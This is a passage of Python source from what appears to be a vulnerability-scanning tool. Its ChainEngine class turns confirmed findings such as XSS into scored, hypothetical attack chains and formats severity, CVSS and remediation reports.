            if vtype and (confidence == "high" or validation == "confirmed"):
                confirmed_findings.append(finding)

        if not confirmed_findings:
            self._log("No confirmed findings - cannot build chains")
            return chains

        has_high_confidence = any(f.get("confidence") == "high" for f in confirmed_findings)
        if not has_high_confidence:
            self._log("No high-confidence findings - chains not built (too speculative)")
            return chains

        confirmed_types = set(f["type"] for f in confirmed_findings)
        viable_types = {vt for vt in confirmed_types if vt in self._chain_graph and self._chain_graph[vt].get("chain_to")}

        if not viable_types:
            self._log(f"Confirmed types have no defined chains: {sorted(confirmed_types)}")
            return chains

        self._log(f"Building chains from {len(confirmed_findings)} confirmed findings, types: {sorted(viable_types)}")

        scored_chains = []
        for vuln_type in viable_types:
            node = self._chain_graph[vuln_type]
            for chain_key, chain_data in node.get("chain_to", {}).items():
                chain = self._build_single_chain(
                    vuln_type=vuln_type,
                    chain_key=chain_key,
                    chain_data=chain_data,
                    endpoint=endpoint,
                    findings=confirmed_findings,
                )
                if chain:
                    probability = self._score_chain(chain, confirmed_findings)
                    scored_chains.append((probability, chain))

        scored_chains.sort(key=lambda x: x[0], reverse=True)

        filtered = []
        for prob, chain in scored_chains:
            if prob >= MIN_CHAIN_PROBABILITY:
                chain.chain_probability = prob
                filtered.append(chain)
                self._log(f"  Chain: {chain.name} (severity={chain.severity}, probability={prob:.2f})")
            else:
                self._log(f"  Skipped low-probability chain: {chain.name} ({prob:.2f} < {MIN_CHAIN_PROBABILITY})")

        result = filtered[:MAX_CHAINS_PER_ENDPOINT]

        if len(filtered) > MAX_CHAINS_PER_ENDPOINT:
            self._log(f"Capped output: {len(filtered)} chains built, showing top {MAX_CHAINS_PER_ENDPOINT}")

        if result:
            self._log(f"Final: {len(result)} attack chains for {endpoint}")

        return result

    def _score_chain(self, chain: AttackChain, findings: list) -> float:
        """Calculate chain probability: confidence × exploitability × impact.

        Higher probability = more likely and more dangerous.
        """
        entry_finding = None
        for f in findings:
            if f.get("type") == chain.steps[0].vuln_type if chain.steps else "":
                entry_finding = f
                break

        confidence_factor = CONFIDENCE_WEIGHT.get(
            entry_finding.get("confidence", "low") if entry_finding else "low", 0.3
        )

        step_count = len(chain.steps)
        exploitability_factor = EXPLOITABILITY_BY_LENGTH.get(step_count, 0.3)

        impact_factor = IMPACT_SEVERITY_FACTOR.get(chain.severity, 1.0)

        probability = round(confidence_factor * exploitability_factor * impact_factor, 3)

        return min(probability, 1.0)

    def _build_single_chain(self, vuln_type: str, chain_key: str, chain_data: dict,
                            endpoint: str, findings: list) -> AttackChain | None:
        steps = []
        step_num = 1

        entry_finding = None
        for f in findings:
            if f.get("type") == vuln_type:
                entry_finding = f
                break

        if not entry_finding:
            return None

        steps.append(ChainStep(
            step_number=step_num,
            vuln_type=vuln_type,
            action=f"Exploit {vuln_type.upper()}",
            description=entry_finding.get("reason", f"Confirmed {vuln_type} vulnerability"),
            required_condition=f"Vulnerable parameter: {entry_finding.get('param', 'unknown')}",
            impact=f"Entry point established via {vuln_type}",
        ))
        step_num += 1

        for step_data in chain_data.get("steps", []):
            steps.append(ChainStep(
                step_number=step_num,
                vuln_type=chain_key,
                action=step_data.get("action", ""),
                description=step_data.get("description", ""),
                required_condition=step_data.get("condition", ""),
                impact=step_data.get("impact", ""),
            ))
            step_num += 1

        if len(steps) < 2:
            return None

        severity_boost = chain_data.get("severity_boost", 1)
        base_severity = self._get_base_severity(vuln_type)
        base_level = {"low": 0, "medium": 1, "high": 2, "critical": 3}.get(base_severity, 0)
        escalated_level = min(base_level + severity_boost, 3)
        escalated_severity = ["low", "medium", "high", "critical"][escalated_level]

        impact_score = self._calculate_chain_score(steps)
        final_severity = self._score_to_severity(impact_score)
        if {"low": 0, "medium": 1, "high": 2, "critical": 3}.get(final_severity, 0) < escalated_level:
            final_severity = ["low", "medium", "high", "critical"][escalated_level]

        chain_name = chain_data.get("name", f"{vuln_type} -> {chain_key}")
        chain_id = self._generate_chain_id(vuln_type, chain_name, endpoint)

        step_descriptions = [f"Step {s.step_number}: {s.action}" for s in steps]
        attack_path_str = "\n".join(step_descriptions)

        chain = AttackChain(
            chain_id=chain_id,
            name=chain_name,
            description=chain_data.get("description", ""),
            steps=steps,
            severity=final_severity,
            impact_score=impact_score,
            cvss_estimate=self._estimate_cvss(final_severity, len(steps)),
            business_impact=chain_data.get("business_impact", ""),
            remediation_priority="immediate" if final_severity in ("critical", "high") else "high",
            real_world_example=chain_data.get("real_world_example", ""),
        )

        self._log(f"Built chain: {chain_name} ({vuln_type} -> {chain_key})")

        return chain

    def _estimate_cvss(self, severity: str, chain_length: int) -> str:
        severity_ranges = {
            "low": (0.1, 3.9),
            "medium": (4.0, 6.9),
            "high": (7.0, 8.9),
            "critical": (9.0, 10.0),
        }
        low, high = severity_ranges.get(severity, (0.0, 10.0))
        depth_factor = min(chain_length / 5.0, 1.0)
        score = low + (high - low) * depth_factor
        return f"{score:.1f}"

    def get_chain_summary(self, chains: list, mode: str = "detailed", findings: list = None) -> dict:
        if not chains:
            return {"total_chains": 0, "chains": [], "max_severity": "none", "max_score": 0.0}

        severity_order = {"low": 0, "medium": 1, "high": 2, "critical": 3}
        max_severity = max(chains, key=lambda c: severity_order.get(c.severity, 0))

        return {
            "total_chains": len(chains),
            "chains": [self._chain_to_dict(c, mode, findings) for c in chains],
            "max_severity": max_severity.severity,
            "max_score": max_severity.impact_score,
            "chain_mode": mode,
        }

    def _chain_to_dict(self, chain: AttackChain, mode: str = "detailed", findings: list = None) -> dict:
        return {
            "chain_id": chain.chain_id,
            "name": chain.name,
            "description": chain.description,
            "severity": chain.severity,
            "impact_score": chain.impact_score,
            "chain_probability": chain.chain_probability,
            "cvss_estimate": chain.cvss_estimate,
            "business_impact": chain.business_impact,
            "remediation_priority": chain.remediation_priority,
            "real_world_example": chain.real_world_example,
            "steps": [
                {
                    "step": s.step_number,
                    "vuln_type": s.vuln_type,
                    "action": s.action,
                    "description": s.description,
                    "impact": s.impact,
                }
                for s in chain.steps
            ],
            "step_count": len(chain.steps),
            "formatted_report": self.format_chain_report(chain, mode, findings),
        }

    def format_chain_report(self, chain: AttackChain, mode: str = "detailed", findings: list = None) -> str:
        """Generate clean human-readable chain report.

        Modes:
        - summary: One-liner with severity, name, probability, impact
        - detailed: Full step-by-step breakdown with confidence explanation

        Format: Step 1 -> Step 2 -> Step 3 => Impact
        """
        lines = []
        severity_tag = f"[{chain.severity.upper()}]"
        summary_line = f"{severity_tag} {chain.name} | Score: {chain.impact_score} | Prob: {chain.chain_probability:.2f} | CVSS: {chain.cvss_estimate}"

        if mode == "summary":
            steps_arrow = " -> ".join([s.action for s in chain.steps])
            lines.append(summary_line)
            lines.append(f"  Path: {steps_arrow}")
            lines.append(f"  Impact: {chain.business_impact}")
            return "\n".join(lines)

        lines.append(summary_line)
        lines.append(f"  {chain.description}")
        lines.append("")

        if findings:
            conf_lines = self._build_confidence_explanation(chain, findings)
            if conf_lines:
                lines.append("  Confidence Explanation:")
                for cl in conf_lines:
                    lines.append(f"    {cl}")
                lines.append("")

        for i, step in enumerate(chain.steps):
            arrow = "->" if i < len(chain.steps) - 1 else "=>"
            step_label = f"  Step {step.step_number}"
            if step.description:
                lines.append(f"{step_label} {arrow} {step.action}: {step.description}")
            else:
                lines.append(f"{step_label} {arrow} {step.action}")
            if step.required_condition:
                lines.append(f"           Condition: {step.required_condition}")
        lines.append("")
        lines.append(f"  Impact: {chain.business_impact}")
        lines.append(f"  CVSS: {chain.cvss_estimate}")
        lines.append(f"  Remediation: {chain.remediation_priority}")
        if chain.real_world_example:
            lines.append(f"  Real-world: {chain.real_world_example}")
        return "\n".join(lines)

    def _build_confidence_explanation(self, chain: AttackChain, findings: list) -> list:
        """Build step-by-step confidence reasoning for interview/demo clarity.

        Example:
          - XSS confirmed via reflected payload (confidence: high, 0.95)
          - Session cookie accessible (document.cookie not httpOnly)
          - Auth endpoint present (found /api/user endpoint)
          - Chain viability: 4 steps, exploitability 0.70
        """
        reasons = []
        entry_type = chain.steps[0].vuln_type if chain.steps else ""

        entry_finding = None
        for f in findings:
            if f.get("type") == entry_type:
                entry_finding = f
                break

        if entry_finding:
            conf = entry_finding.get("confidence", "unknown")
            reason = entry_finding.get("reason", "")
            param = entry_finding.get("param", "")
            reasons.append(f"{entry_type.upper()} confirmed via {reason or 'payload reflection'} (confidence: {conf})")
            if param:
                reasons.append(f"  Vulnerable parameter: {param}")

        for step in chain.steps[1:]:
            if step.impact:
                reasons.append(f"{step.impact}")

        exploitability = EXPLOITABILITY_BY_LENGTH.get(len(chain.steps), 0.3)
        reasons.append(f"Chain viability: {len(chain.steps)} steps, exploitability: {exploitability:.2f}")

        return reasons

    def get_all_possible_chains(self) -> list:
        """Return all defined chains in the graph (for documentation/testing)."""
        all_chains = []
        for vuln_type, node in self._chain_graph.items():
            for chain_key, chain_data in node.get("chain_to", {}).items():
                all_chains.append({
                    "entry": vuln_type,
                    "chain": chain_key,
                    "name": chain_data.get("name", ""),
                    "description": chain_data.get("description", ""),
                    "severity_boost": chain_data.get("severity_boost", 0),
                    "steps": len(chain_data.get("steps", [])),
                    "real_world_example": chain_data.get("real_world_example", ""),
                })
        return all_chains


def build_attack_chains(findings: list, endpoint: str, mode: str = "detailed") -> dict:
    """Main entry point: build attack chains from findings.

    Args:
        findings: List of confirmed vulnerability findings from the pipeline.
        endpoint: The URL/endpoint being analyzed.
        mode: "summary" (compact) or "detailed" (full step-by-step + confidence explanation).

    Returns:
        Dictionary with chain summary and individual chain details.
    """
    engine = ChainEngine()
    chains = engine.build_chains(findings, endpoint)
    return engine.get_chain_summary(chains, mode, findings)
